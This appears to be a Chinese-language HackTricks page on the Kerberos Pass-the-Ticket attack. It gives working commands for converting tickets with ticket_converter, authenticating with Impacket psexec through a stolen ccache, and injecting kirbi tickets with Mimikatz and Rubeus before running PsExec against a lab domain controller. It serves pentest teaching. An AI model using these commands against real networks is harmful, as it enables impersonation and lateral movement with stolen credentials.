# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## 概述

在 Pass-the-Ticket (PtT) 攻击中，攻击者使用窃取的 Kerberos ticket，在不拥有该账户密码的情况下，以 ticket 的主体身份进行身份验证。ticket-granting ticket (TGT) 可用于请求 service ticket，而窃取的 service ticket 仅限于其目标服务和有效期。<sup>[[1]](#references)</sup>

有关 ticket 获取技术，请参阅：

- [从 Windows 收集 ticket](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [从 Linux 收集 ticket](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## 转换 Linux 和 Windows Ticket 格式

Kerberos 缓存通常在 Linux 上以 MIT `ccache` 文件的形式出现，在 Windows 上则以 `.kirbi` 文件的形式出现。`ticket_converter` 使用输入 ticket 和输出路径在这两种格式之间进行转换。<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo 还在 Windows 上提供 Kerberos ticket 工具。<sup>[[3]](#references)</sup>

## 使用 Ticket

在 Linux 上，将 `KRB5CCNAME` 指向缓存，并指示 Impacket client 使用 Kerberos，而无需提示输入密码：<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
在 Windows 上，Mimikatz 或 Rubeus 可以将 `.kirbi` ticket 导入当前登录会话。使用 `klist` 检查生成的缓存。<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Ticket import 不会授予超出 ticket 所代表权限以及目标服务授权策略范围之外的权限。已过期、已撤销、格式错误或作用域不正确的 ticket 可能会失败。<sup>[[1]](#references)</sup>

如需了解更广泛的 Kerberos 攻击背景及相关 ticket 获取技术，请参阅 Tarlogic 的 Kerberos 攻击指南。<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket 示例](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos 攻击技术](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
